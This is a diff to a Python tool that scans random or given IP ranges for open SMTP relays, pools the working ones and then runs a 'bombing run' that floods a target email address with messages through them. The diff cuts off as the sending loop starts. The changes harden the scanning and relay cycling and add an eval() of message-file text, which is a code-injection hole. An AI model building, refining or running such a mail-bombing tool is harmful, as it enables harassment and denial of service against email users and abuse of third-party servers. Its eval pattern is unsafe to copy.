@@ -20,6 +20,7 @@ import socket
 import ipaddress
 import re
 import concurrent.futures
+from concurrent.futures import ThreadPoolExecutor
 import textwrap
 import os
 import json
@@ -41,6 +42,7 @@ try:
     from rich.live import Live
     from rich.logging import RichHandler
     from rich import box
+    from rich.errors import MarkupError # Import specific error
 except ImportError:
     print("Error: 'rich' library not found. Please install it using: pip install rich")
     exit(1) # Exit if essential TUI library is missing
@@ -80,7 +82,8 @@ rich_handler = RichHandler(
     console=console, 
     show_path=False, 
     level=logging.INFO, # Level specifically for console output
-    log_time_format="[%X]" # Use shorter time format for console
+    log_time_format="[%X]", # Use shorter time format for console
+    markup=True # Ensure RichHandler processes markup
     ) 
 log.addHandler(rich_handler)
 
@@ -249,7 +252,9 @@ def load_messages(filepath: Optional[str]) -> List[str]:
     final_messages = []
     for msg in messages_to_load:
          try:
-             final_messages.append(msg.format(random=random)) # Allow basic formatting like {random.randint(..)}
+             # Allow basic f-string like formatting using random module
+             formatted_msg = eval(f'f"""{msg}"""', {'random': random}) 
+             final_messages.append(formatted_msg)
          except Exception as fmt_err:
              log.debug(f"Could not format message: '{msg}'. Error: {fmt_err}. Using literal message.")
              final_messages.append(msg) # Use the original string if formatting fails
@@ -318,14 +323,23 @@ class RelayManager:
                         
                         # Only add if essential fields are present
                         if 'host' in relay_info_data and 'port' in relay_info_data:
+                           # Basic type check for fields loaded from JSON
+                           relay_info_data['port'] = int(relay_info_data['port'])
+                           relay_info_data['last_checked'] = float(relay_info_data.get('last_checked', 0.0))
+                           relay_info_data['success_count'] = int(relay_info_data.get('success_count', 0))
+                           relay_info_data['failure_count'] = int(relay_info_data.get('failure_count', 0))
+                           # avg_response_time might be None or float
+                           if 'avg_response_time' in relay_info_data and relay_info_data['avg_response_time'] is not None:
+                               relay_info_data['avg_response_time'] = float(relay_info_data['avg_response_time'])
+
                            relay = RelayInfo(**relay_info_data) 
                            self.known_relays[(relay.host, relay.port)] = relay
                            loaded_count += 1
                         else:
-                            log.warning(f"Skipping cache entry {key_str}: Missing essential fields.")
+                            log.warning(f"Skipping cache entry {key_str}: Missing essential fields ('host', 'port').")
                              
                     except (ValueError, TypeError, KeyError) as e:
-                        log.warning(f"Skipping invalid entry in cache '{key_str}': {e}")
+                        log.warning(f"Skipping invalid or corrupted entry in cache '{key_str}': {e}")
                 log.info(f"Loaded {loaded_count} relays from cache: {self.cache_file}")
             except (json.JSONDecodeError, IOError) as e:
                 log.error(f"Failed to load or parse relay cache '{self.cache_file}': {e}")
@@ -371,24 +385,29 @@ class RelayManager:
             if is_working:
                 relay.success_count += 1
                 relay.failure_count = 0 # Reset failure count on success
-                if connection and not relay.connection: # Only update connection if needed
-                    relay.connection = connection
+                if connection: # Only store connection if provided (implies success)
+                    # If it already has a connection object (e.g. from previous check), close old one? Let's assume caller handles this.
+                    relay.connection = connection 
                     if relay not in self.active_relays: # Add to active if not already there
                         self.active_relays.append(relay)
-                        log.debug(f"Reactivated relay {host}:{port} in active pool.")
-            else:
+                        log.debug(f"Added/Reactivated relay {host}:{port} in active pool.")
+            else: # Status indicates failure
                 relay.failure_count += 1
                 # If it failed, ensure connection is closed and removed from active pool
-                if relay in self.active_relays:
-                    if relay.connection:
-                        try: relay.connection.quit() 
-                        except: pass # Ignore errors on quit
-                    relay.connection = None
+                if relay.connection: # Close any existing connection
+                     try: 
+                         relay.connection.quit() 
+                         log.debug(f"Closed connection for failed relay {host}:{port}")
+                     except: pass # Ignore errors on quit
+                     relay.connection = None
+
+                if relay in self.active_relays: # Remove from active list
                     try:
-                         self.active_relays.remove(relay)
-                         log.debug(f"Removed failed/inactive relay {host}:{port} from active pool.")
+                        self.active_relays.remove(relay)
+                        log.debug(f"Removed failed/inactive relay {host}:{port} from active pool.")
                     except ValueError:
-                         pass # Already removed, potentially by another thread/check
+                        log.debug(f"Relay {host}:{port} already removed from active pool.")
+                        pass # Already removed, potentially by another thread/check
         else:
             # Add new relay
             relay = RelayInfo(host=host, port=port, status=status, last_checked=now)
@@ -403,16 +422,15 @@ class RelayManager:
             self.known_relays[key] = relay # Add to the main dictionary
             
         # Reset the cycler whenever the active pool might have changed
-        if self.active_relays:
-            self._active_relay_cycler = itertools.cycle(self.active_relays)
-        else:
-             self._active_relay_cycler = None
+        # Only cycle if there are active relays
+        self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
+
 
     def get_scan_targets(self, config: AppConfig, previous_log_ips: List[str]) -> List[Dict[str, Any]]:
         """Prepares the list of target dictionaries ({'host', 'port', 'source'}) for scanning."""
         targets: List[Dict[str, Any]] = []
         # Use a set to efficiently track hosts/ports already added
-        processed: Set[Tuple[str, int]] = set() 
+        processed: set[Tuple[str, int]] = set() 
 
         # 1. Prioritize relays from the cache based on past success/recency
         if config.use_relay_cache:
@@ -427,12 +445,14 @@ class RelayManager:
                 ),
                 reverse=True # Sort descending by primary criteria
             )
+            cache_targets_added = 0
             for relay in sorted_cached_relays:
                 key = (relay.host, relay.port)
                 if key not in processed:
                     targets.append({'host': relay.host, 'port': relay.port, 'source': 'cache'})
                     processed.add(key)
-            log.debug(f"Added {len(targets)} targets from cache.")
+                    cache_targets_added += 1
+            log.debug(f"Added {cache_targets_added} targets from cache.")
 
         # 2. Add relays from the legacy log file if enabled
         if config.load_previous_log and previous_log_ips:
@@ -455,11 +475,14 @@ class RelayManager:
         # 3. Add targets from the user-specified range/host or generated random range
         range_targets_added = 0
         # Ensure base_hosts gets generated only if scan_range_raw is empty initially
-        if not config.scan_range_raw and not config.get_scan_hosts():
+        base_hosts: List[str] = []
+        if not config.scan_range_raw:
+             log.info("No scan range provided, generating random target range.")
              base_hosts = config.generate_random_scan_hosts()
-             log.info(f"Generated {len(base_hosts)} hosts from random range {config.scan_range_raw}")
         else:
              base_hosts = config.get_scan_hosts()
+             if not base_hosts and config.scan_range_raw: # Input was given but didn't resolve to hosts
+                 log.warning(f"Could not resolve scan target '{config.scan_range_raw}' to any hosts.")
 
         if base_hosts:
             for host in base_hosts:
@@ -469,77 +492,85 @@ class RelayManager:
                         targets.append({'host': host, 'port': port, 'source': 'scan_range'})
                         processed.add(key)
                         range_targets_added += 1
-        log.debug(f"Added {range_targets_added} targets from configured scan range/host.")
+            log.debug(f"Added {range_targets_added} targets from configured/generated scan range/host across {len(config.scan_ports)} port(s).")
 
         log.info(f"Prepared a total of {len(targets)} unique targets for scanning.")
+        # Shuffle targets to potentially distribute load better across subnets if scanning large ranges
+        random.shuffle(targets) 
+        log.debug("Shuffled scan targets order.")
         return targets
 
     def get_next_active_relay(self) -> Optional[RelayInfo]:
         """Cycles through the active relay list and returns the next available one."""
         if not self.active_relays:
-            log.debug("Relay pool is empty.")
+            log.debug("Cannot get next relay: Relay pool is empty.")
             return None
             
+        # Initialize cycler if it doesn't exist or is exhausted (though cycle shouldn't exhaust)
         if self._active_relay_cycler is None:
             log.debug("Initializing active relay cycler.")
             self._active_relay_cycler = itertools.cycle(self.active_relays)
         
-        # Try getting the next relay, handle potential issues
-        start_index = -1 # To detect if we've looped fully
-        try:
-            # Get the list we're currently cycling over (important if it changes)
-            current_cycle_list = list(self._active_relay_cycler.__self__) # Access underlying sequence if possible (might be implementation specific)
-            if not current_cycle_list: current_cycle_list = self.active_relays # Fallback
-            
-            # Iterate through the cycle, but max attempts = current pool size to prevent infinite loops
-            for attempt in range(len(current_cycle_list) + 1): # +1 just in case
+        # Try getting the next relay, but iterate max pool size times to prevent infinite loops
+        # This is important if relays are being removed concurrently or cycler behaves oddly
+        initial_pool_size = len(self.active_relays)
+        for _ in range(initial_pool_size + 1): # +1 for safety margin
+            try:
                 relay = next(self._active_relay_cycler)
                 
-                # Basic checks before returning: Is it still considered active? Does it have a connection?
+                # Crucial Check: Is the relay still in the *current* active_relays list?
+                # AND does it still have its connection object?
                 if relay in self.active_relays and relay.connection:
                     log.debug(f"Returning next active relay: {relay.host}:{relay.port}")
-                    # Optional: Perform NOOP check here for connection validity - adds overhead
+                    # --- Optional but Recommended: NOOP Check ---
+                    # Uncomment to add a quick check if the server is still responding. 
+                    # This adds latency but increases reliability.
                     # try:
-                    #    relay.connection.noop()
-                    # except (smtplib.SMTPServerDisconnected, smtplib.SMTPException):
-                    #    log.warning(f"Relay {relay.host}:{relay.port} failed NOOP check. Marking failed.")
-                    #    self.mark_relay_failed(relay, "noop_failed")
-                    #    continue # Try the next one in the cycle
-                    return relay
+                    #     relay.connection.noop()
+                    #     log.debug(f"Relay {relay.host}:{relay.port} passed NOOP check.")
+                    # except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error) as noop_err:
+                    #     log.warning(f"Relay {relay.host}:{relay.port} failed NOOP check ({noop_err}). Marking failed.")
+                    #     self.mark_relay_failed(relay, "noop_failed")
+                    #     continue # Try the next one in the cycle
+                    # except Exception as noop_unexpected_err:
+                    #      log.error(f"Unexpected error during NOOP check for {relay.host}:{relay.port}: {noop_unexpected_err}")
+                    #      self.mark_relay_failed(relay, "noop_error")
+                    #      continue
+                    # --- End Optional NOOP Check ---
+                    return relay # Found a valid, active relay
                 else:
-                    log.debug(f"Skipping relay {relay.host}:{relay.port} as it's no longer active or lacks connection.")
-                    # It might have been removed by another thread, let the cycle continue
+                    # This relay was likely removed from active_relays since the cycle started
+                    log.debug(f"Skipping relay {relay.host}:{relay.port} from cycle; it's no longer active or lost connection.")
+                    # Let the loop continue to find the next valid one
             
-            # If we exhausted the attempts without finding a valid one
-            log.warning("Cycled through all potential relays without finding an active one.")
-            return None
-            
-        except StopIteration:
-            log.debug("Relay cycler unexpectedly exhausted.")
-            self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
-            return None # No active relays left
-        except AttributeError: # If __self__ isn't available on the cycle object
-            log.warning("Could not determine cycle length reliably. Falling back to basic cycle.")
-            # Less safe loop detection, relies only on StopIteration
-            try:
-                return next(self._active_relay_cycler)
             except StopIteration:
+                # Should not happen with itertools.cycle unless the list became empty mid-iteration
+                log.debug("Relay cycler stopped. Re-initializing if pool still has relays.")
+                self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
+                if not self.active_relays: return None # Pool is now confirmed empty
+                # Continue loop to try getting the next item after re-initializing
+            except Exception as e:
+                log.error(f"Unexpected error while getting next relay: {e}", exc_info=True)
+                # Attempt to recover by resetting the cycle, return None for this attempt
+                self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
                 return None
-        except Exception as e:
-            log.error(f"Unexpected error getting next relay: {e}", exc_info=True)
-            # Attempt to reset the cycle
-            self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
-            return None
+
+        # If loop completes without returning a relay
+        log.warning("Cycled through available relays but couldn't find a valid active one.")
+        return None
 
 
     def mark_relay_failed(self, relay_info: RelayInfo, reason: str = "send_error"):
         """Marks a specific relay as failed, providing a reason."""
-        if relay_info:
-             log.warning(f"Marking relay {relay_info.host}:{relay_info.port} as failed. Reason: {reason}.")
-             # Update status, which handles closing connection & removing from active pool
-             self.add_or_update_relay(relay_info.host, relay_info.port, reason) 
-        else:
-             log.error("Attempted to mark a None relay as failed.")
+        # Check if relay_info is valid before proceeding
+        if not relay_info or not hasattr(relay_info, 'host') or not hasattr(relay_info, 'port'):
+             log.error(f"Attempted to mark an invalid RelayInfo object as failed. Reason: {reason}")
+             return
+
+        log.warning(f"Marking relay {relay_info.host}:{relay_info.port} as failed. Reason: {reason}.")
+        # Use add_or_update_relay, which handles status update, connection closing, and removal from active pool
+        self.add_or_update_relay(relay_info.host, relay_info.port, status=reason) 
+
 
     def close_all_connections(self):
         """Attempts to cleanly quit all active SMTP connections."""
@@ -548,34 +579,40 @@ class RelayManager:
             return
             
         log.info(f"Attempting to close {len(self.active_relays)} active relay connections...")
-        # Iterate over a copy of the list as closing might modify the original
+        # Iterate over a copy of the list, as closing modifies the original indirectly via add_or_update_relay
         active_copy = list(self.active_relays) 
         closed_count = 0
         for relay in active_copy:
+            # Ensure connection exists before trying to close
             if relay.connection:
                 log.debug(f"Closing connection to {relay.host}:{relay.port}...")
                 try:
-                    # Use quit() for graceful closure
-                    relay.connection.quit()
+                    relay.connection.quit() # Graceful SMTP QUIT
                     closed_count += 1
-                except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error):
-                    # Ignore errors during quit, connection might already be dead
-                    log.debug(f"Error ignored during quit for {relay.host}:{relay.port} (likely already closed).")
-                    pass 
+                except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error) as e:
+                    # Ignore errors on quit, as connection might be dead already.
+                    log.debug(f"Ignored error during quit for {relay.host}:{relay.port}: {e}")
                 except Exception as e:
-                    # Log unexpected errors during quit
+                    # Log other unexpected errors during the quit process
                     log.warning(f"Unexpected error quitting {relay.host}:{relay.port}: {e}")
                 finally:
-                     # Ensure connection attribute is cleared regardless of quit success/failure
-                     relay.connection = None 
-                     # Ensure it's removed from the active list if marking failed didn't catch it
-                     if relay in self.active_relays:
-                           try: self.active_relays.remove(relay)
-                           except ValueError: pass # Already gone
-        
-        self.active_relays.clear() # Explicitly clear the list after processing copy
-        self._active_relay_cycler = None # Reset the cycler
-        log.info(f"Finished closing connections. {closed_count} closed gracefully (or attempted).")
+                     # Important: Set connection attribute to None regardless of quit success/failure
+                     relay.connection = None
+            
+            # Ensure it's removed from the main active_relays list if not already done by mark_relay_failed
+            # This covers cases where cleanup happens without an explicit failure status update.
+            if relay in self.active_relays:
+                try:
+                    self.active_relays.remove(relay)
+                    log.debug(f"Relay {relay.host}:{relay.port} removed from active pool during final cleanup.")
+                except ValueError:
+                    pass # Already removed
+
+        # Explicitly clear the list and cycler after processing all
+        # Although elements were removed individually, this ensures consistency.
+        self.active_relays.clear() 
+        self._active_relay_cycler = None
+        log.info(f"Finished closing connections. {closed_count} explicitly quit (or attempted). Pool cleared.")
 
 
 # --- Scanning Logic ---
@@ -600,41 +637,52 @@ def test_single_relay(target: Dict[str, Any], timeout: int) -> Tuple[Dict[str, A
         start_time = time.monotonic() # For potential future timing metrics
         
         # --- Step 1: Establish Connection (handling different port conventions) ---
+        resolved_host = hostname # Keep original if connection fails for logging
+        try:
+             # Optionally resolve hostname here if needed, though smtplib handles it
+             # resolved_host = socket.gethostbyname(hostname) 
+             # log.debug(f"Resolved {hostname} to {resolved_host}")
+             pass
+        except socket.gaierror as dns_err:
+              log.debug(f"DNS lookup failed for {hostname}: {dns_err}")
+              return target, None, "dns_error" # Return early on DNS failure
+
         if port == 465:
             # Port 465 typically uses Implicit SSL/TLS from the start
-            log.debug(f"Connecting via SMTP_SSL to {hostname}:{port} (Timeout: {timeout}s)")
-            server = smtplib.SMTP_SSL(hostname, port, timeout=timeout)
+            log.debug(f"Connecting via SMTP_SSL to {resolved_host}:{port} (Timeout: {timeout}s)")
+            server = smtplib.SMTP_SSL(resolved_host, port, timeout=timeout)
             # Send EHLO after connection established
             server.ehlo(sender_domain) # Use domain for ehlo
         else:
             # Ports 25, 587 typically start plain, then may use STARTTLS
-            log.debug(f"Connecting via SMTP to {hostname}:{port} (Timeout: {timeout}s)")
-            server = smtplib.SMTP(hostname, port, timeout=timeout)
+            log.debug(f"Connecting via SMTP to {resolved_host}:{port} (Timeout: {timeout}s)")
+            server = smtplib.SMTP(resolved_host, port, timeout=timeout)
             server.ehlo(sender_domain) # Initial EHLO
             if port == 587: 
                 # Port 587 (Submission) usually requires STARTTLS
-                log.debug(f"Attempting STARTTLS on {hostname}:{port}...")
-                try:
-                    if server.has_extn('starttls'):
+                log.debug(f"Checking STARTTLS support on {resolved_host}:{port}...")
+                if server.has_extn('starttls'):
+                    log.debug(f"Attempting STARTTLS on {resolved_host}:{port}...")
+                    try:
                         server.starttls()
-                        # Re-issue EHLO after successful STARTTLS
+                        # Re-issue EHLO after successful STARTTLS for capabilities negotiation
                         server.ehlo(sender_domain) 
-                        log.debug(f"STARTTLS successful on {hostname}:{port}")
-                    else:
-                         log.warning(f"Server {hostname}:{port} does not support STARTTLS, though on port 587.")
-                         # Decide if this constitutes failure - arguably yes for port 587
-                         status = "starttls_unsupported"
-                         # Try graceful quit before returning
-                         try: server.quit()
-                         except: pass 
-                         return target, None, status
-                except smtplib.SMTPException as tls_error:
-                    log.warning(f"STARTTLS failed on {hostname}:{port}: {tls_error}")
-                    status = "starttls_failed"
+                        log.debug(f"STARTTLS successful on {resolved_host}:{port}")
+                    except smtplib.SMTPException as tls_error:
+                        log.warning(f"STARTTLS command failed on {resolved_host}:{port}: {tls_error}")
+                        status = "starttls_failed"
+                        # Try graceful quit before returning
+                        try: server.quit()
+                        except: pass
+                        return target, None, status # Return early if STARTTLS fails on 587
+                else:
+                    log.warning(f"Server {resolved_host}:{port} (Port 587) does not advertise STARTTLS support.")
+                    # Decide if this constitutes failure - yes, standard requires STARTTLS on 587 for submission
+                    status = "starttls_unsupported"
                     # Try graceful quit before returning
-                    try: server.quit() 
-                    except: pass
-                    return target, None, status # Return early if STARTTLS fails on 587
+                    try: server.quit()
+                    except: pass 
+                    return target, None, status
 
         # --- Step 2: Prepare and Send Test Message to check Relay ---
         msg = MIMEMultipart('alternative')
@@ -648,16 +696,16 @@ def test_single_relay(target: Dict[str, Any], timeout: int) -> Tuple[Dict[str, A
         msg_body = f"Relay test initiated {time.time()} from host."
         msg.attach(MIMEText(msg_body, 'plain', 'utf-8')) # Ensure UTF-8
         
-        log.debug(f"Attempting relay test send: {sender} -> {receiver} via {hostname}:{port}")
+        log.debug(f"Attempting relay test send: {sender} -> {receiver} via {resolved_host}:{port}")
         
         # The core test: Can we send from our fake sender to fake receiver?
-        server.sendmail(sender, receiver, msg.as_string())
+        server.sendmail(sender, [receiver], msg.as_string()) # recipient should be a list
         
         # --- Step 3: Success ---
         # If sendmail did not raise an exception, assume relaying worked
         end_time = time.monotonic()
         response_time = end_time - start_time
-        log.info(f"[bold green]SUCCESS[/]: Open relay confirmed at {hostname}:{port} (Time: {response_time:.2f}s)")
+        log.info(f"[bold green]SUCCESS[/]: Open relay confirmed at {hostname}:{port} (Resolved: {resolved_host}, Time: {response_time:.2f}s)")
         status = "working"
         # Keep the connection object open and return it
         return target, server, status
@@ -699,12 +747,10 @@ def test_single_relay(target: Dict[str, Any], timeout: int) -> Tuple[Dict[str, A
     except socket.timeout:
         log.debug(f"Connection timed out for {hostname}:{port}")
         status = "timeout"
-    except socket.gaierror as e:
-        # DNS resolution errors
-        log.debug(f"DNS lookup error for hostname '{hostname}': {e}")
-        status = "dns_error"
+    # Removed gaierror handler here as it's caught earlier
     except (socket.error, OSError) as e: 
         # Lower-level socket errors (e.g., Connection refused, Network unreachable)
+        # Use hostname here as resolved_host might not be set if connection failed early
         log.debug(f"Socket/OS error connecting to {hostname}:{port}: {e}")
         status = "socket_error"
     except Exception as e:
@@ -717,8 +763,7 @@ def test_single_relay(target: Dict[str, Any], timeout: int) -> Tuple[Dict[str, A
         try:
             # Try to gracefully quit the connection
             server.quit()
-        except: 
-            # Ignore any errors during cleanup quit (connection might be dead)
+        except Exception: # Ignore any errors during cleanup quit
             pass
             
     # Return the target info, None for connection object, and the determined status string
@@ -732,103 +777,144 @@ def run_scan(config: AppConfig, relay_manager: RelayManager, previous_log_ips: L
     if not scan_targets:
         log.warning("Scan initiated, but no targets were identified (check range, cache, log settings).")
         # Add a dummy task to show completion immediately if desired, or just return
-        # progress.add_task("[yellow]Scan Skipped", total=1, completed=1) 
+        try: # Safely add progress task
+           scan_task_id = progress.add_task("[yellow]Scan Skipped (No Targets)", total=1, completed=1) 
+           progress.update(scan_task_id, completed=1) # Mark complete
+        except Exception as prog_err:
+             log.error(f"Error adding skip task to progress: {prog_err}")
         return
 
     # --- Setup Progress Bar Task for Scanning ---
-    task_scan_id = progress.add_task("[cyan]Scanning Relays", total=len(scan_targets), start=True)
+    try:
+         task_scan_id = progress.add_task("[cyan]Scanning Relays", total=len(scan_targets), start=True)
+    except Exception as prog_err:
+        log.error(f"Failed to add scan task to progress bar: {prog_err}")
+        return # Cannot proceed without progress task safely
+
     found_count = 0
     tested_count = 0
     
-    # Determine max workers, ensuring it's at least 1
-    max_workers = min(config.scan_workers, len(scan_targets))
+    # Determine max workers, ensuring it's at least 1 and not excessively large
+    max_workers = min(config.scan_workers, len(scan_targets), os.cpu_count() * 10 if os.cpu_count() else 100) # Cap relative to CPUs
     if max_workers <= 0: max_workers = 1 
     log.info(f"Starting relay scan with up to {max_workers} concurrent workers.")
 
     # Keep track of submitted futures
     futures: Set[concurrent.futures.Future] = set()
     scan_stopped_early = False
+    executor_instance : Optional[ThreadPoolExecutor] = None # To reference for shutdown
 
     try:
         # --- Execute Tests in Parallel ---
         with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="Scanner_") as executor:
+            executor_instance = executor # Keep ref for potential early shutdown
             # Submit initial batch of tasks
             for target in scan_targets:
-                # Check if we've already found enough relays before submitting more
-                if len(relay_manager.active_relays) >= config.relay_pool_target:
+                # Check if we've already found enough relays (and target is non-zero)
+                if config.relay_pool_target > 0 and len(relay_manager.active_relays) >= config.relay_pool_target:
                     log.info(f"Relay pool target ({config.relay_pool_target}) reached. Halting submission of new scan tasks.")
                     scan_stopped_early = True
-                    break # Stop submitting new jobs
+                    # Don't break immediately, let already submitted tasks finish unless explicitly cancelling below
+                    # We can try to cancel remaining *unsubmitted* targets implicitly by not submitting more
+                    break # Stop submitting new jobs from the scan_targets list
                     
                 future = executor.submit(test_single_relay, target, config.scan_timeout)
                 futures.add(future)
 
             # --- Process Completed Futures ---
-            log.debug(f"Submitted {len(futures)} initial scan tasks. Waiting for results...")
+            log.debug(f"Submitted {len(futures)} scan tasks. Waiting for results...")
+            # Use as_completed to process results as they become available
             for future in concurrent.futures.as_completed(futures):
                 tested_count += 1
                 
-                if progress.tasks[task_scan_id].finished: # Check if task was marked finished early
-                      log.debug("Scan task finished, skipping result processing.")
-                      continue
-                      
+                # Check if progress task exists and is finished
+                try:
+                     if progress.tasks[task_scan_id].finished: 
+                         log.debug("Scan task already marked finished, skipping further result processing.")
+                         # Optional: Try cancelling this specific future if possible?
+                         # future.cancel()
+                         continue
+                except IndexError:
+                      log.warning("Scan progress task seems to be missing.")
+                      break # Exit loop if progress tracking is lost
+
                 try:
                     # Retrieve the result from the completed future
                     target_back, connection, status = future.result()
                     
-                    # Update the RelayManager with the result (this handles adding to active pool if successful)
+                    # Update the RelayManager with the result 
+                    # This handles adding to active pool if status == 'working'
                     relay_manager.add_or_update_relay(target_back['host'], target_back['port'], status, connection)
                     
                     if status == "working":
                         found_count += 1
-                        log.debug(f"Found relay #{found_count} at {target_back['host']}:{target_back['port']}")
-                        # Update progress description with the count of found relays
+                        log.debug(f"Found working relay #{found_count}: {target_back['host']}:{target_back['port']}")
+                        # Update progress bar - description shows current found count
                         progress.update(task_scan_id, advance=1, description=f"[cyan]Scanning Relays ({found_count} Found)")
                         
-                        # Check if the pool target is met *after processing this result*
-                        if not scan_stopped_early and len(relay_manager.active_relays) >= config.relay_pool_target:
-                            log.info(f"Relay pool target ({config.relay_pool_target}) reached after processing result. Scan will finish soon.")
-                            scan_stopped_early = True 
-                            # Optional: Aggressively cancel remaining tasks
-                            # log.debug("Attempting to cancel remaining scan tasks...")
-                            # for f in futures: f.cancel() # Note: cancel() doesn't always work if task is running
-                            # executor.shutdown(wait=False, cancel_futures=True) # More forceful shutdown
+                        # Check again if the pool target is met after processing this positive result
+                        if not scan_stopped_early and config.relay_pool_target > 0 and len(relay_manager.active_relays) >= config.relay_pool_target:
+                            log.info(f"Relay pool target ({config.relay_pool_target}) reached while processing results.")
+                            scan_stopped_early = True
+                            # Option 1: Just stop submitting new tasks (already done) and let others finish.
+                            # Option 2: Try to shutdown executor more forcefully (might lose some results)
+                            # if executor_instance:
+                            #      log.info("Attempting early shutdown of scan executor...")
+                            #      executor_instance.shutdown(wait=False, cancel_futures=True) 
 
-                    else:
-                        # Log failed tests at debug level to avoid console flooding
-                        log.debug(f"Test failed for {target_back['host']}:{target_back['port']} with status: {status}")
-                        progress.update(task_scan_id, advance=1)
+                    else: # Test failed or resulted in non-working status
+                        log.debug(f"Test for {target_back['host']}:{target_back['port']} resulted in status: {status}")
+                        progress.update(task_scan_id, advance=1) # Still advance progress
                         
                 except concurrent.futures.CancelledError:
                       log.debug("A scan task was cancelled.")
-                      progress.update(task_scan_id, advance=1) # Still advance progress
+                      progress.update(task_scan_id, advance=1) # Advance progress for cancelled task
                 except Exception as exc:
-                    # Catch errors *during future result processing itself*, not errors within test_single_relay
-                    log.error(f'Error processing a scan result: {exc}', exc_info=True)
-                    progress.update(task_scan_id, advance=1) # Ensure progress advances even on error
+                    # Catch errors *during future result retrieval/processing*, not errors within test_single_relay
+                    log.error(f'Error processing a scan result future: {exc}', exc_info=True)
+                    progress.update(task_scan_id, advance=1) # Ensure progress advances
+
+            # After loop finishes or breaks due to target reached
+            log.debug("Finished processing completed scan futures.")
+
 
     except KeyboardInterrupt:
         log.warning("Scan interrupted by user (KeyboardInterrupt).")
-        progress.stop() # Stop the progress display cleanly
-        # Cancel remaining futures if possible? This might be handled by executor shutdown
-        # executor.shutdown(wait=False, cancel_futures=True) # Consider adding if needed
-        raise # Re-raise KeyboardInterrupt to be caught by the main application loop
+        # Executor context manager will handle shutdown, potentially cancelling pending tasks
+        # Ensure progress is stopped cleanly
+        try:
+             progress.stop() 
+        except Exception: pass # Ignore errors stopping progress if already stopped
+        raise # Re-raise KeyboardInterrupt for main app loop handling
+        
     except Exception as e:
-        log.critical(f"Critical error occurred during scan execution: {e}", exc_info=True)
-        progress.stop() # Ensure progress stops on critical errors
+        log.critical(f"Critical error occurred during scan execution management: {e}", exc_info=True)
+        try: 
+            progress.stop() # Ensure progress stops on critical errors
+        except Exception: pass
+        # Let finally block handle cache save if possible
 
     finally:
-        log.debug("Scan execution block finished.")
-        # Ensure the progress task is appropriately marked as finished
-        if not progress.tasks[task_scan_id].finished:
-            final_desc = f"[cyan]Scan Completed ({len(relay_manager.active_relays)} Relays Found)"
-            if scan_stopped_early:
-                 final_desc = f"[yellow]Scan Halted ({len(relay_manager.active_relays)} Relays Found - Target Met)"
-            # Ensure completed count matches total for the progress bar to look right
-            progress.update(task_scan_id, completed=len(scan_targets), description=final_desc)
-            
-    log.info(f"Relay scan phase complete. Found {len(relay_manager.active_relays)} working relays.")
-    # Save the cache after the scan finishes (or is interrupted)
+        log.debug("Scan execution block finalizing.")
+        # Ensure the progress task is updated and marked finished correctly
+        try:
+            if not progress.tasks[task_scan_id].finished:
+                completed_count = progress.tasks[task_scan_id].completed
+                total_count = progress.tasks[task_scan_id].total
+                remaining = total_count - completed_count
+                
+                if scan_stopped_early:
+                    final_desc = f"[yellow]Scan Halted ({len(relay_manager.active_relays)} Found - Target Met)"
+                    # Advance progress for any remaining tasks that weren't processed due to early stop
+                    progress.update(task_scan_id, advance=remaining, completed=total_count, description=final_desc)
+                else:
+                    final_desc = f"[cyan]Scan Completed ({len(relay_manager.active_relays)} Relays Found)"
+                    progress.update(task_scan_id, completed=total_count, description=final_desc)
+        except (IndexError, Exception) as fin_err:
+             log.warning(f"Could not finalize scan progress task: {fin_err}")
+             
+    log.info(f"Relay scan phase complete. Found {len(relay_manager.active_relays)} working relays from {tested_count} tests performed.")
+    # Save the cache after the scan finishes (or is interrupted/errored)
     relay_manager.save_cache()
 
 
@@ -838,211 +924,243 @@ def run_bombing(config: AppConfig, relay_manager: RelayManager, progress: Progre
     
     # Pre-check: Ensure we have relays to work with
     if not relay_manager.active_relays:
-        log.error("Cannot start bombing run: No active relays are available.")
+        log.error("Cannot start bombing run: No active relays are available in the pool.")
         # Add a progress task to show bombing was skipped
-        progress.add_task("[red]Bombing Skipped (No Relays)", total=1, completed=1)
+        try: progress.add_task("[red]Bombing Skipped (No Relays)", total=1, completed=1)
+        except Exception as e: log.error(f"Error adding skip task to progress: {e}")
         return
 
     # Pre-check: Load messages
     messages = load_messages(config.message_file)
     if not messages:
-         log.error("Cannot start bombing run: No messages loaded (check file or defaults).")
-         progress.add_task("[red]Bombing Skipped (No Messages)", total=1, completed=1)
+         log.error("Cannot start bombing run: No messages loaded (check file path or default list).")
+         try: progress.add_task("[red]Bombing Skipped (No Messages)", total=1, completed=1)
+         except Exception as e: log.error(f"Error adding skip task to progress: {e}")
          return
 
     # --- Setup Progress Bar Task for Bombing ---
-    task_bomb_id = progress.add_task("[magenta]Sending Messages", total=config.message_count, start=True)
+    try:
+         task_bomb_id = progress.add_task("[magenta]Sending Messages", total=config.message_count, start=True)
+    except Exception as prog_err:
+        log.error(f"Failed to add bombing task to progress bar: {prog_err}")
+        return # Cannot proceed without progress task safely
+        
     sent_count = 0
-    failure_this_message = 0 # Count failures for the *current* message index
+    failure_count_this_message = 0 # Count failures for the *current* message index being attempted
+    total_consecutive_failures = 0 # Count overall failures without *any* success across all relays
     
-    # Abort if too many failures occur *without managing to send a single message* via any relay
-    max_total_failures_before_abort = len(relay_manager.active_relays) * 3 # Example threshold
+    # Determine when to give up entirely - adjust multiplier as needed
+    max_total_consecutive_failures_before_abort = max(5, len(relay_manager.active_relays) * 3) # At least 5, or 3x pool size
+    max_failures_per_message_before_skip = max(3, len(relay_manager.active_relays) + 1) # Try each relay once + maybe retry a couple
 
-    log.info(f"Starting bombing run: Target={config.target_email}, Count={config.message_count}, Delay=({config.delay_min:.1f}-{config.delay_max:.1f}s)")
-    log.info(f"Utilizing relay pool with {len(relay_manager.active_relays)} active servers.")
+
+    log.info(f"Starting bombing run: Target='{config.target_email}', Count={config.message_count}, Delay=({config.delay_min:.1f}-{config.delay_max:.1f}s)")
+    log.info(f"Utilizing relay pool with {len(relay_manager.active_relays)} active server(s).")
     
     try:
-        # Loop for the target number of messages to *send*
